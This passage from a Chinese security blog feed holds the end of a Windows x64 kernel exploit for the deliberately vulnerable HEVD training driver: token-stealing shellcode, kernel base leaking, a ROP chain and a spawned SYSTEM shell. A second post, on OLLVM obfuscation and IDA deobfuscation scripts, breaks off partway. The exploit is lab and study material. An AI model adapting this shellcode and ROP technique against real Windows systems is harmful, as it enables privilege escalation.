class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xFF</span>, <span class="number">0xC1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QWORD <span class="title function_">getBaseAddr</span><span class="params">(LPCWSTR drvName)</span> &#123;</span><br><span class="line">  LPVOID drivers[<span class="number">512</span>];</span><br><span class="line">  DWORD cbNeeded;</span><br><span class="line">  <span class="type">int</span> nDrivers, i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (EnumDeviceDrivers(drivers, <span class="keyword">sizeof</span>(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; <span class="keyword">sizeof</span>(drivers)) &#123;</span><br><span class="line">    WCHAR szDrivers[<span class="number">512</span>];</span><br><span class="line">    nDrivers = cbNeeded / <span class="keyword">sizeof</span>(drivers[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nDrivers; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], szDrivers, <span class="keyword">sizeof</span>(szDrivers) / <span class="keyword">sizeof</span>(szDrivers[<span class="number">0</span>]))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (wcscmp(szDrivers, drvName) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> (QWORD)drivers[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">get_kernel_symbol_addr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* symbol, PVOID ntbase)</span> &#123;</span><br><span class="line">  PVOID kernelBaseAddr;</span><br><span class="line">  HMODULE userKernelHandle;</span><br><span class="line">  PCHAR functionAddress;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line"></span><br><span class="line">  kernelBaseAddr = ntbase;  <span class="comment">// Loads kernel base address</span></span><br><span class="line">  userKernelHandle = LoadLibraryA(<span class="string">&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;</span>);  <span class="comment">// Gets kernel binary</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (userKernelHandle == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  <span class="comment">// Finds given symbol</span></span><br><span class="line">  <span class="keyword">if</span> (functionAddress == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">// Could not find symbol</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  offset = functionAddress - ((PCHAR)userKernelHandle);  <span class="comment">// Subtracts the loaded binary&#x27;s base address from the found address. This way, we will find the offset of the symbol for base address 0.</span></span><br><span class="line">  <span class="keyword">return</span> (PVOID)(((PCHAR)kernelBaseAddr) + offset);  <span class="comment">// Adds the offset to the leaked base address.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QWORD ntBase = getBaseAddr(<span class="string">L&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] NTBase: %llx\n&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> add_rsp_20h_ret = ntBase + <span class="number">0xa1b718</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx_ret = ntBase + <span class="number">0x202e71</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rdx_ret = ntBase + <span class="number">0x4e13ce</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> push_rax_pop_r13_ret = ntBase + <span class="number">0x5b6164</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> xchg_r8_r13_ret = ntBase + <span class="number">0x2714f6</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_rcx_r8_mov_rax_rcx_ret = ntBase + <span class="number">0x94133a</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_r8_ret = ntBase + <span class="number">0x201861</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> jmp_rax = ntBase + <span class="number">0x24b024</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_exallocatepoolwithtag = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;ExAllocatePoolWithTag&quot;</span>, ntBase);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernel_memcpy = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) get_kernel_symbol_addr(<span class="string">&quot;memcpy&quot;</span>, ntBase);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">2072</span> + <span class="number">19</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  LPVOID uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">256</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  RtlCopyMemory(shellcode, bufSize, <span class="number">145</span>);</span><br><span class="line"></span><br><span class="line">  QWORD* rop = (QWORD*)((QWORD)uBuffer + <span class="number">2072</span>);</span><br><span class="line"></span><br><span class="line">  *(rop + index++) = pop_rcx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">0</span>;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_exallocatepoolwithtag;</span><br><span class="line">  *(rop + index++) = add_rsp_20h_ret;</span><br><span class="line">  index += <span class="number">4</span>;</span><br><span class="line">  *(rop + index++) = push_rax_pop_r13_ret;</span><br><span class="line">  *(rop + index++) = xchg_r8_r13_ret;</span><br><span class="line">  *(rop + index++) = mov_rcx_r8_mov_rax_rcx_ret;</span><br><span class="line">  *(rop + index++) = pop_rdx_ret;</span><br><span class="line">  *(rop + index++) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(&amp;shellcode);</span><br><span class="line">  *(rop + index++) = pop_r8_ret;</span><br><span class="line">  *(rop + index++) = <span class="number">145</span>;</span><br><span class="line">  *(rop + index++) = kernel_memcpy;</span><br><span class="line">  *(rop + index++) = jmp_rax;</span><br><span class="line"></span><br><span class="line">  DeviceIoControl(hDriver, <span class="number">0x222003</span>, (LPVOID)uBuffer, bufSize, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Enjoy your shell!\n&quot;</span>, ntBase);</span><br><span class="line">  system(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation - HEVD x64 Stack Overflow | xct’s blog</a></p><p><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10 RS5 x64 | Kristal’s Notebook</a></p><p><a href="https://wonderkun.cc/2021/08/22/windows10内核态提权方法汇总/">windows10内核态提权方法汇总 | wonderkun’s | blog</a></p><p><a href="https://mdanilor.github.io/posts/hevd-3/">[Cracking Windows Kernel with HEVD] Chapter 3: Can we rop our way into triggering our shellcode?</a></p><p><a href="https://ommadawn46.hatenablog.com/entry/2024/01/30/101340">Windows 10 22H2 - HEVDで学ぶKernel Exploit - ommadawn46’s blog</a></p>]]></content>
    
    
    <summary type="html">dddd</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="HEVD" scheme="https://ixout.github.io/tags/HEVD/"/>
    
  </entry>
  
  <entry>
    <title>关于ollvm</title>
    <link href="https://ixout.github.io/posts/38804/"/>
    <id>https://ixout.github.io/posts/38804/</id>
    <published>2025-01-07T13:30:59.000Z</published>
    <updated>2025-04-14T12:18:01.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h1><p>llvm包括许多内容, 这里只粗略介绍</p><p>LLVM(Low Level Virtual Machine)是苹果公司的开源编译器框架(最初是由Chris Lattner在2000年开发)</p><p>LLVM的架构采用了前后端分离的设计：</p><ul><li><p><strong>前端</strong>:负责将源代码转换为LLVM IR。</p><p>LLVM支持多种编程语言，如C、C++、Rust、Swift等。LLVM本身并不包括一个通用的编程语言前端，而是依赖于其他项目（如Clang、Rust的编译器等）提供前端功能。</p></li><li><p><strong>后端</strong>:将LLVM IR转换为目标机器代码，支持多种不同的架构（如x86、ARM、RISC-V等）。</p><p>后端负责优化和生成最终的机器代码。</p></li></ul><p>LLVM的一个核心概念是它的中间表示（Intermediate Representation，IR）。LLVM IR 是一种类似汇编语言的低级表示，它具有三个形式：</p><ul><li><strong>LLVM位码（LLVM Bitcode）</strong>：一种二进制格式，通常用于文件存储或传输。</li><li><strong>LLVM汇编语言</strong>：一种文本格式，便于阅读和调试。</li><li><strong>LLVM机器代码</strong>：最终生成的目标机器代码。</li></ul><p>LLVM IR非常接近汇编语言，但具有更多的抽象，可以在多种平台之间进行优化和转换。</p><h1 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h1><p><a href="https://github.com/obfuscator-llvm/obfuscator">OLLVM(Obfuscator-LLVM)</a>是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个项目,该项目旨在提供一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b llvm-4.0 --depth=1 https://github.com/obfuscator-llvm/obfuscator.git</span><br><span class="line">sudo docker pull nickdiego/ollvm-build</span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/oacia/docker-ollvm.git</span><br><span class="line">sudo docker-ollvm/ollvm-build.sh obfuscator/</span><br></pre></td></tr></table></figure><p>使用docker进行编译, 编译需要一段时间</p><p>安装完成后即可在obfuscator/build_release/bin/目录下找到编译结果</p><p>之后我们选择一个小小的demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* input)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; input[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">        sum += input[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum == <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">complex_calculation</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        result = a * b + (a ^ b);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = a + b * (a &amp; b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_message</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* msg = <span class="string">&quot;Hello, OLLVM!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;password&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (check_password(argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Password correct!\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Password wrong!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x = complex_calculation(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Calculation result: %d\n&quot;</span>, x);</span><br><span class="line">    </span><br><span class="line">    print_message();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="BCF-虚假控制流"><a href="#BCF-虚假控制流" class="headerlink" title="BCF(虚假控制流)"></a>BCF(虚假控制流)</h1><p>虚假控制流混淆主要通过加入包含不透明谓词的条件跳转和不可达的基本块，来干扰IDA的控制流分析和F5反汇编</p><p>也就是说一些跳转在运行之前就已经可以确定, 但IDA等工具却无法分析</p><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>混淆前</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_192333.png" alt=""></p><p>混淆后</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_192402.png" alt=""></p><h2 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h2><p>使用ollvm对程序进行BCF混淆</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.c -o bcf</span><br></pre></td></tr></table></figure><ul><li><code>-mllvm -bcf</code>: 激活虚假控制流</li><li><code>-mllvm -bcf_loop=3</code> : 混淆次数，这里一个函数会被混淆 3 次，默认为 1</li><li><code>-mllvm -bcf_prob=40</code> : 每个基本块被混淆的概率，这里每个基本块被混淆的概率为 40%，默认为 30 %</li></ul><p>查看混淆后的结果</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_163329.png" alt=""></p><p>可以看到这个表达式<code>y_11 &gt;= 10 &amp;&amp; ((((_BYTE)x_10 - 1) * (_BYTE)x_10) &amp; 1) != 0</code></p><p>观察到<code>(((_BYTE)x_10 - 1) * (_BYTE)x_10)</code>,也就是<code>x * (x- 1)</code>,这个永远是一个偶数, 那么偶数在二进制的表示最低位肯定是0, 所以这个条件永远也不可能满足</p><p>但因为<code>y_11</code>和<code>x_10</code>是变量, IDA无法确定他们的值, 因此在反编译结果中保留了这部分代码</p><h2 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h2><h3 id="消除不透明谓词"><a href="#消除不透明谓词" class="headerlink" title="消除不透明谓词"></a>消除不透明谓词</h3><p>两种方案</p><p><strong>第一种</strong>: 将<code>mov 寄存器, 不透明谓词</code>全部改为<code>mov 寄存器, 0</code></p><p>样例脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去除虚假控制流 idapython 脚本</span></span><br><span class="line"><span class="keyword">import</span> ida_xref</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将 mov 寄存器，不透明谓词 修改为 mov 寄存器，0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_patch</span>(<span class="params">ea</span>):</span><br><span class="line">    <span class="keyword">if</span> get_bytes(ea, <span class="number">1</span>) == <span class="string">b&quot;\x8B&quot;</span>: <span class="comment"># mov eax-edi, dword</span></span><br><span class="line">        reg = (<span class="built_in">ord</span>(get_bytes(ea + <span class="number">1</span>, <span class="number">1</span>)) &amp; <span class="number">0b00111000</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">        patch_bytes(ea, (<span class="number">0xB8</span> + reg).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + <span class="string">b&#x27;\x00\x00\x00\x00\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 不透明谓词在.bss 段的范围</span></span><br><span class="line">seg = ida_segment.get_segm_by_name(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">start = seg.start_ea</span><br><span class="line">end = seg.end_ea</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(start,end,<span class="number">4</span>):</span><br><span class="line">    ref = ida_xref.get_first_dref_to(addr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(addr).center(<span class="number">20</span>,<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">    <span class="comment"># 获取所有交叉引用</span></span><br><span class="line">    <span class="keyword">while</span>(ref != ida_idaapi.BADADDR):</span><br><span class="line">        do_patch(ref)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;patch at &#x27;</span> + <span class="built_in">hex</span>(ref))</span><br><span class="line">        ref = ida_xref.get_next_dref_to(addr, ref)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p><strong>第二种</strong>: 将.bss段改为只读, 并且逐个对不透明谓词进行赋值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">seg = ida_segment.get_segm_by_name(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ea <span class="keyword">in</span> <span class="built_in">range</span>(seg.start_ea, seg.end_ea,<span class="number">4</span>):</span><br><span class="line">    ida_bytes.patch_bytes(ea, <span class="built_in">int</span>(<span class="number">2</span>).to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">seg.perm: 由三位二进制数表示,例如一个segment为可读,不可写,不可执行,则seg.perm = 0b100</span></span><br><span class="line"><span class="string">(seg.perm &gt;&gt; 2)&amp;1: Read</span></span><br><span class="line"><span class="string">(seg.perm &gt;&gt; 1)&amp;1: Write</span></span><br><span class="line"><span class="string">(seg.perm &gt;&gt; 0)&amp;1: Execute</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">seg.perm = <span class="number">0b100</span></span><br></pre></td></tr></table></figure><h3 id="模拟执行"><a href="#模拟执行" class="headerlink" title="模拟执行"></a>模拟执行</h3><p>使用angr或unicorn等模拟执行工具, 标记不可达块, 再将其nop</p><p>例如工具<a href="[cq674350529/deflat: use angr to deobfuscation](https://github.com/cq674350529/deflat">deflat</a>)</p><h3 id="d810"><a href="#d810" class="headerlink" title="d810"></a>d810</h3><p><a href="[joydo/d810](https://github.com/joydo/d810">d810</a>)是一个十分强大的IDA反混淆插件</p><p>安装后在<code>Edit-&gt;plugins-&gt;D-810</code>打开插件后, 选择规则, 点击start, 然后再次反编译函数即可</p><p>d810包含许多默认规则</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_172006.png" alt=""></p><p>适用于去虚假控制流, 去指令替换, 去平坦化等情况</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-14_171648.png" alt=""></p><h4 id="d810添加规则"><a href="#d810添加规则" class="headerlink" title="d810添加规则"></a>d810添加规则</h4><p>如果有配置文件不包含的情况出现, 可以额外添加配置</p><p>打开对应的配置文件<code>\plugins\d810\conf\xxx.json</code></p><p><code>ins_rules</code>属性添加一个成员</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newrule&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;is_activated&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>然后在根据具体的代码找到<code>plugins\d810\optimizers\instructions\pattern_matching\rewrite_xxx.py</code>, 新增对应的类</p><h1 id="FLA-控制流平坦化"><a href="#FLA-控制流平坦化" class="headerlink" title="FLA(控制流平坦化)"></a>FLA(控制流平坦化)</h1><p>控制流平坦化，主要通过一个主分发器来控制程序基本块的执行流程。该方法将所有基本代码放到控制流最底部，然后删除原理基本块之间跳转关系，添加次分发器来控制分发逻辑，然后过新的复杂分发逻辑还原原来程序块之间的逻辑关系。</p><p><img src="C:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250414192801135.png" alt="image-20250414192801135"></p><ul><li>序言：函数的第一个执行的基本块 主 (子) </li><li>分发器：控制程序跳转到下一个待执行的基本块 </li><li>retn 块：函数出口 </li><li>真实块：混淆前的基本块，程序真正执行工作的块 